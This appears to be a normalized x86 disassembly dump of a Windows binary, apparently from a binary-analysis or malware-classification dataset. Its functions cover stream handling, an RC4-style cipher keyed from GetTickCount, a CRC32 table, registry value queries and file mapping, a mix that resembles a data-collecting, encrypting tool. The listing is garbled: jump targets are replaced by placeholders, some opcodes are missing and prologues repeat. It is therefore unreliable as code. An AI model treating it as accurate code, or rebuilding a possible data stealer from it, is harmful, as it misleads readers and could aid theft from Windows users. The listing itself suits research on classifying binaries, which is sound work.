sub_401021
push ebp
mov ebp esp
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x7400087d ]
or ecx [ ebx + 0x128b0855 ]
push [ ebp + 0x8 ]
call [ edx + 0x8 ]
leave
retn 0x4
retn
sub_40105b
push [ ebp + 0xc ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x14 ]
leave
retn 0xc
sub_401082
push ebp
mov ebp esp
add esp 0xfffffff8
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc edi
inc ebp
clc
add [ eax ] al
add [ eax ] al
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
push eax
push 0x2
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x14 ]
mov eax [ ebp - 0x8 ]
leave
retn 0x4
retn
sub_4010c2
push ebp
mov ebp esp
add esp 0xfffffff8
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc edi
inc ebp
clc
add [ eax ] al
add [ eax ] al
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x14 ]
push [ ebp + 0x8 ]
call sub_401082
push eax
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
push 0x0
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x14 ]
pop eax
mov edx [ ebp - 0x8 ]
add edx [ ebp + 0xc ]
cmp edx eax
jbe r-xdata
retn
mov eax 0x1
leave
retn 0x8
sub eax eax
leave
retn 0x8
sub_401147
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4010c2
or eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0xc ]
test eax eax
js r-xdata
leave
retn 0xc
sub eax eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
sub eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
leave
retn 0xc
sub_40118c
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push ebp
mov ebp esp
pop ebp
push r-xdata
clc
jb r-xdata
inc [ ebx + 0x74000c7d ]
push es
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub eax eax
pop esi
leave
retn 0xc
mov esi [ ebp + 0xc ]
mov eax 0x1
pop esi
leave
retn 0xc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax eax
pop esi
leave
retn 0xc
mov eax [ ebp - 0x4 ]
add esi eax
sub [ ebp + 0x10 ] eax
jne r-xdata
sub eax eax
pop esi
leave
retn 0xc
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call [ edx + 0x10 ]
test eax eax
jns r-xdata
mov eax 0x1
pop esi
leave
retn 0xc
sub_401226
push 0x0
push 0x3
push 0x0
push 0x3
push 0x80000000
push [ ebp + 0x8 ]
call CreateFileA
mov [ ebp - 0x4 ] eax
inc eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push [ ebp - 0x4 ]
call ReadFile
or eax eax
jne r-xdata
leave
retn 0x8
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1008 ]
push eax
push [ ebp + 0xc ]
call sub_40118c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
call CloseHandle
sub eax eax
leave
retn 0x8
push [ ebp - 0x4 ]
call CloseHandle
mov eax 0x1
leave
retn 0x8
sub_4012f0
push [ ebp + 0xc ]
pop [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401047
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x18 ]
leave
retn 0x8
sub_40133e
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401133
mov edx [ ebp + 0x14 ]
and [ edx ] eax
leave
retn 0x10
leave
retn 0x10
sub_401364
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_40133e
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
sub eax eax
mov eax [ ebp - 0x4 ]
bswap eax
jmp r-xdata
leave
retn 0x8
sub_401390
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
push 0x2
lea eax [ ebp - 0x2 ]
push eax
push [ ebp + 0x8 ]
call sub_40133e
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
sub eax eax
movzx eax [ ebp - 0x2 ]
xchg ah al
jmp r-xdata
leave
retn 0x8
sub_4013bd
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0xc ]
push 0x1
lea eax [ ebp - 0x1 ]
push eax
push [ ebp + 0x8 ]
call sub_40133e
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
sub eax eax
movzx eax [ ebp - 0x1 ]
jmp r-xdata
leave
retn 0x8
sub_4013e8
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
cmp [ edx ] 0x0
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4010c2
or eax eax
jne r-xdata
leave
retn 0xc
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401047
mov edx [ ebp + 0x10 ]
mov [ edx ] 0x0
jmp r-xdata
leave
retn 0xc
sub_401422
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
mov esi [ ebp + 0xc ]
sub eax eax
pop esi
leave
retn 0xc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
add esi eax
sub [ ebp + 0x10 ] eax
jne r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call WriteFile
or eax eax
je r-xdata
mov eax 0x1
pop esi
leave
retn 0xc
sub_401463
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
call sub_401082
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
call sub_4012bb
mov edx [ ebp + 0xc ]
mov edx [ edx ]
push 0x0
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call [ edx + 0x1c ]
leave
retn 0x8
sub_40149f
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ edx + 0x14 ]
mov eax [ ebp - 0x8 ]
leave
retn 0x4
sub_40151c
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4014e6
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4014fb
sub_401548
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub eax eax
push [ ebp + 0xc ]
call lstrlenA
jmp r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40151c
leave
retn 0x8
sub_40156d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40149f
push eax
push 0x8
push rw-data
push [ ebp + 0x8 ]
call sub_4014fb
push 0x0
push [ ebp + 0x8 ]
call sub_4014e6
push 0x2
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4014fb
push 0x2
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_4014fb
pop eax
leave
retn 0xc
sub_4015b3
push ebp
mov ebp esp
add esp 0xfffffffc
push [ ebp + 0x8 ]
call sub_401082
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
add [ ebp + 0xc ] 0x8
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401047
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0x8 ]
call sub_40129a
mov eax [ ebp - 0x4 ]
leave
retn 0x8
sub_4015f2
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
mov eax [ ebp - 0xc ]
bswap eax
not eax
push eax
push [ ebp + 0x8 ]
call sub_4014e6
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0x8 ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
push [ ebp - 0x8 ]
push eax
push 0x0
call sub_401d43
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call GlobalUnlock
sub_401658
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
sub eax eax
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x4
jb r-xdata
push [ ebp + 0x8 ]
call sub_40129a
sub eax eax
leave
retn 0x4
sub [ ebp - 0x8 ] 0x4
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
push 0x2
push 0xfffffffc
push [ ebp + 0x8 ]
call sub_401047
mov [ ebp - 0x10 ] 0x1
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_401364
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
push eax
push 0x0
call sub_401d43
bswap eax
not eax
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call GlobalUnlock
jmp r-xdata
sub eax eax
bswap eax
cmp eax [ ebp - 0xc ]
jne r-xdata
sub eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
leave
retn 0x4
sub_401705
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
leave
retn 0x8
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0x8 ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push eax
call sub_402414
push [ ebp - 0x4 ]
call GlobalUnlock
sub_401752
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
sub ebx ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
mov eax ebx
pop ebx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
mov [ ebp - 0x10 ] eax
push [ ebp - 0xc ]
call sub_411a52
add esp 0x4
add eax 0x500000
push eax
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0xc ]
call sub_411a58
add esp 0x4
add eax 0x100000
push eax
call sub_40184c
mov [ ebp - 0x18 ] eax
push 0x0
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp - 0x18 ]
push [ ebp - 0x10 ]
call sub_411a66
add esp 0x14
mov [ ebp - 0x8 ] eax
push [ ebp - 0x4 ]
call GlobalUnlock
push [ ebp + 0x8 ]
call sub_40131f
push 0x8
push rw-data
push [ ebp + 0x8 ]
call sub_4014fb
or ebx eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_4014e6
and ebx eax
push [ ebp - 0x8 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40151c
and ebx eax
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
sub_401863
push ebp
mov ebp esp
push edi
cld
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
jecxz r-xdata
pop edi
leave
retn 0x8
push ecx
shr ecx 0x2
sub eax eax
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
sub_401883
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
cld
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
pop edi
pop esi
leave
retn 0xc
[ edi ] [ esi ]
sub_40189c
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0x8 ]
cld
mov ecx [ ebp + 0x10 ]
sub eax eax
mov edi [ ebp + 0xc ]
jecxz r-xdata
or ecx ecx
jne r-xdata
[ esi ] [ edi ]
pop edi
pop esi
leave
retn 0xc
inc eax
sub_4018bc
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push ebx
push 0x102
push [ ebp + 0x8 ]
call sub_401863
mov edi [ ebp + 0x8 ]
inc edi
inc edi
sub edx edx
mov ecx 0x100
mov [ edx + edi ] dl
inc dl
loop r-xdata
mov edi [ ebp + 0x8 ]
inc edi
inc edi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x2 ] 0x0
sub ecx ecx
sub ebx ebx
inc bl
jne r-xdata
sub ecx ecx
mov al [ ebx + edi ]
mov [ ebp - 0x1 ] al
add [ ebp - 0x2 ] al
mov al [ ecx + esi ]
add [ ebp - 0x2 ] al
movzx edx [ ebp - 0x2 ]
mov al [ edx + edi ]
mov [ ebx + edi ] al
mov al [ ebp - 0x1 ]
mov [ edx + edi ] al
inc ecx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
pop ebx
pop edi
pop esi
leave
retn 0xc
sub_401927
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
push [ ebp + 0x8 ]
pop ebx
mov al [ ebx ]
mov [ ebp - 0x3 ] al
mov al [ ebx + 0x1 ]
mov [ ebp - 0x4 ] al
mov edi ebx
inc edi
inc edi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov al [ ebp - 0x3 ]
mov [ ebx ] al
mov al [ ebp - 0x4 ]
mov [ ebx + 0x1 ] al
pop edi
pop esi
pop ebx
leave
retn 0xc
inc [ ebp - 0x3 ]
movzx eax [ ebp - 0x3 ]
movzx edx [ eax + edi ]
mov [ ebp - 0x1 ] dl
add [ ebp - 0x4 ] dl
movzx eax [ ebp - 0x4 ]
mov dl [ eax + edi ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x3 ]
mov [ eax + edi ] dl
movzx eax [ ebp - 0x4 ]
mov dl [ ebp - 0x1 ]
mov [ eax + edi ] dl
mov dl [ ebp - 0x1 ]
add dl [ ebp - 0x2 ]
mov dl [ edx + edi ]
mov eax [ ebp - 0x8 ]
xor [ eax + esi ] dl
inc [ ebp - 0x8 ]
loop r-xdata
sub_4019a4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
sub ebx ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
mov eax ebx
pop ebx
leave
retn 0x8
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
mov [ ebp - 0x10 ] eax
push [ ebp - 0xc ]
call sub_40184c
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
call sub_401883
push [ ebp - 0x4 ]
call GlobalUnlock
push [ ebp + 0xc ]
call lstrlenA
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x112 ]
push eax
call sub_4018bc
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x112 ]
push eax
call sub_401927
push [ ebp + 0x8 ]
call sub_40131f
push 0x8
push rw-data
push [ ebp + 0x8 ]
call sub_4014fb
or ebx eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_4014fb
and ebx eax
push [ ebp - 0x8 ]
call sub_401835
sub_401a69
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
call GetTickCount
rol eax 0xb
not eax
mov [ ebp - 0x118 ] eax
sub ebx ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
mov eax ebx
pop ebx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
mov [ ebp - 0x10 ] eax
push [ ebp - 0xc ]
call sub_40184c
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
call sub_401883
push [ ebp - 0x4 ]
call GlobalUnlock
push 0x4
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x112 ]
push eax
call sub_4018bc
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x112 ]
push eax
call sub_401927
push [ ebp + 0x8 ]
call sub_40131f
push 0x4
lea eax [ ebp - 0x118 ]
push eax
push [ ebp + 0x8 ]
call sub_4014fb
or ebx eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_4014fb
and ebx eax
push [ ebp - 0x8 ]
call sub_401835
sub_401b3d
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
sub ebx ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp + 0x8 ]
call sub_40129a
mov eax ebx
pop ebx
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_401082
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x4
jb r-xdata
push [ ebp - 0x4 ]
call GlobalLock
or eax eax
je r-xdata
mov [ ebp - 0x10 ] eax
push [ ebp - 0xc ]
call sub_40184c
mov [ ebp - 0x8 ] eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x10 ]
call sub_401883
push [ ebp - 0x4 ]
call GlobalUnlock
push 0x4
push [ ebp - 0x8 ]
lea eax [ ebp - 0x112 ]
push eax
call sub_4018bc
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x118 ] eax
sub [ ebp - 0xc ] 0x4
push [ ebp - 0xc ]
push [ ebp - 0x118 ]
lea eax [ ebp - 0x112 ]
push eax
call sub_401927
push [ ebp + 0x8 ]
call sub_40131f
push [ ebp - 0xc ]
push [ ebp - 0x118 ]
push [ ebp + 0x8 ]
call sub_4014fb
mov ebx eax
push [ ebp - 0x8 ]
call sub_401835
sub_401c0a
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
mov eax [ ebp + 0x14 ]
or eax eax
je r-xdata
sub edi edi
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
mov [ eax ] 0x0
cmp [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx 0x200
jmp r-xdata
sub edx edx
mov edx 0x100
jmp r-xdata
or edx 0x20019
lea eax [ ebp - 0x4 ]
push eax
push edx
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyExA
or eax eax
jne r-xdata
mov eax edi
or eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call RegQueryValueExA
or eax eax
jne r-xdata
pop edi
leave
retn 0x14
cmp [ ebp + 0x18 ] 0x2
jae r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
inc eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401c0a
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
push eax
call sub_40184c
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push edi
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call RegQueryValueExA
or eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x1
je r-xdata
mov eax [ ebp + 0x14 ]
or eax eax
je r-xdata
push edi
call sub_401835
sub edi edi
jmp r-xdata
push [ ebp - 0x8 ]
pop [ eax ]
sub_401cee
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x80000001
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401c0a
leave
retn 0x10
push [ rw-data ]
pop [ ebp + 0x8 ]
sub_401d1a
sub eax eax
loop r-xdata
xor edx 0xfca99231
xor edx 0x11111111
shr edx 0x1
jae r-xdata
mov [ eax * 4 + rw-data ] edx
inc al
jne r-xdata
mov edx eax
shl edx 0x1
mov ecx 0x9
retn
sub_401d43
push ebp
mov ebp esp
push edi
mov eax [ ebp + 0x8 ]
not eax
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
not eax
pop edi
leave
retn 0xc
mov edx eax
shr edx 0x8
xor al [ edi ]
and eax 0xff
mov eax [ eax * 4 + rw-data ]
xor eax edx
inc edi
loop r-xdata
sub_401d75
push ebp
mov ebp esp
push ebx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] rw-data
push [ ebp + 0x8 ]
call lstrlenA
mov ebx eax
push [ ebp + 0xc ]
call lstrlenA
add ebx eax
inc ebx
push ebx
call sub_40184c
mov ebx eax
push [ ebp + 0x8 ]
push ebx
call lstrcpyA
push [ ebp + 0xc ]
push ebx
call lstrcatA
mov eax ebx
pop ebx
leave
retn 0x8
mov [ ebp + 0xc ] rw-data
sub_401dc9
push ebp
mov ebp esp
push ebx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] rw-data
push [ ebp + 0x8 ]
call lstrlenA
mov ebx eax
push [ ebp + 0xc ]
call lstrlenA
add ebx eax
inc ebx
push ebx
call sub_40184c
mov ebx eax
push [ ebp + 0x8 ]
push ebx
call lstrcpyA
push [ ebp + 0xc ]
push ebx
call lstrcatA
cmp [ ebp + 0x8 ] rw-data
je r-xdata
mov [ ebp + 0xc ] rw-data
mov eax ebx
pop ebx
leave
retn 0x8
push [ ebp + 0x8 ]
call sub_401835
sub_401e2e
push ebp
mov ebp esp
add esp 0xfffffffc
push edi
push 0x105
call sub_40184c
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
push 0x0
push 0x0
push [ ebp + 0x8 ]
push 0x0
call [ rw-data ]
test eax eax
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x4
push [ ebp - 0x4 ]
call sub_401835
mov [ ebp - 0x4 ] 0x0
mov edi rw-data
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov edx [ edi ]
mov eax [ ebp + 0x8 ]
and eax 0xffff7fff
cmp [ edx + 0x4 ] eax
jne r-xdata
add edi 0x4
push 0x0
lea eax [ edx + 0x8 ]
push eax
push rw-data
push [ edx ]
call sub_401cee
or eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_401eb3
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
or eax eax
je r-xdata
mov eax 0x0
pop ebx
leave
retn 0x4
cmp [ eax ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0x80
push [ ebp + 0x8 ]
call CreateFileA
mov ebx eax
sub eax eax
inc ebx
je r-xdata
pop ebx
leave
retn 0x4
push ebx
call CloseHandle
mov eax 0x1
sub_401efb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or eax eax
je r-xdata
mov eax 0x0
leave
retn 0x4
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call GetFileAttributesA
cmp eax 0xffffffff
je r-xdata
mov eax 0x0
test eax 0x10
setne al
movzx eax al
jmp r-xdata
leave
retn 0x4
sub_401f36
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x0
push [ ebp + 0x8 ]
call ExpandEnvironmentStringsA
or eax eax
je r-xdata
leave
retn 0x4
push eax
push eax
call sub_40184c
mov [ ebp - 0x4 ] eax
pop eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call ExpandEnvironmentStringsA
or eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_401835
sub eax eax
jmp r-xdata
sub_401f7a
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push 0x10
push ebx
call sub_401863
push 0x0
push 0x0
push 0x3
push 0x0
push 0x3
push 0x80000000
push [ ebp + 0x8 ]
call CreateFileA
mov [ ebx ] eax
inc eax
je r-xdata
sub eax eax
cmp [ ebx + 0x8 ] eax
setne al
pop ebx
leave
retn 0x8
push 0x0
push eax
call GetFileSize
mov [ ebx + 0xc ] eax
push 0x0
push 0x0
push 0x0
push 0x2
push 0x0
push [ ebx ]
call CreateFileMappingA
or eax eax
je r-xdata
push [ ebx ]
call CloseHandle
mov [ ebx ] 0xffffffff
mov [ ebx + 0x4 ] eax
push 0x0
push 0x0
push 0x0
push 0x4
push eax
call MapViewOfFile
mov [ ebx + 0x8 ] eax
or eax eax
jne r-xdata
push [ ebx + 0x4 ]
call CloseHandle
push [ ebx ]
call CloseHandle
mov [ ebx ] 0xffffffff
jmp r-xdata
sub_40200e
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ ebx ] 0xffffffff
je r-xdata
pop ebx
leave
retn 0x4
push [ ebx + 0x8 ]
call UnmapViewOfFile
push [ ebx + 0x4 ]
call CloseHandle
push [ ebx ]
call CloseHandle
sub_402036
push ebp
mov ebp esp
add esp 0xffffefe0
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_401835
mov [ rw-data ] 0x0
lea eax [ ebp - 0x1010 ]
push eax
call sub_401000
lea eax [ ebp - 0x1014 ]
push eax
call sub_401000
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push 0x80000002
call RegOpenKeyA
or eax eax
jne r-xdata
push [ rw-data ]
call sub_401835
mov [ rw-data ] 0x0
push 0x0
push [ ebp - 0x1010 ]
call sub_4014e6
push 0x0
push [ ebp - 0x1014 ]
call sub_4014e6
lea eax [ ebp - 0x101c ]
push eax
push [ ebp - 0x1010 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
mov [ ebp - 0x100c ] 0x0
lea eax [ ebp - 0x101c ]
push eax
push [ ebp - 0x1014 ]
call GetHGlobalFromStream
test eax eax
js r-xdata
push [ ebp - 0x1010 ]
call sub_401082
mov [ ebp - 0x1018 ] eax
push [ ebp - 0x1018 ]
call sub_40184c
mov [ rw-data ] eax
push [ ebp - 0x101c ]
call GlobalLock
or eax eax
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
push rw-data
push rw-data
call sub_401d75
or eax eax
je r-xdata
push [ ebp - 0x1010 ]
call sub_401021
push [ ebp - 0x1014 ]
call sub_401021
pop edi
pop esi
leave
retn
push [ ebp - 0x1014 ]
call sub_401082
mov [ ebp - 0x1018 ] eax
push [ ebp - 0x1018 ]
call sub_40184c
mov [ rw-data ] eax
push [ ebp - 0x101c ]
call GlobalLock
or eax eax
je r-xdata
mov ecx [ ebp - 0x1018 ]
mov esi eax
mov edi [ rw-data ]
[ edi ] [ esi ]
push [ ebp - 0x101c ]
call GlobalUnlock
inc [ ebp - 0x100c ]
jmp r-xdata
mov edx eax
lea eax [ ebp - 0x1004 ]
push eax
push edx
call sub_401dc9
or eax eax
je r-xdata
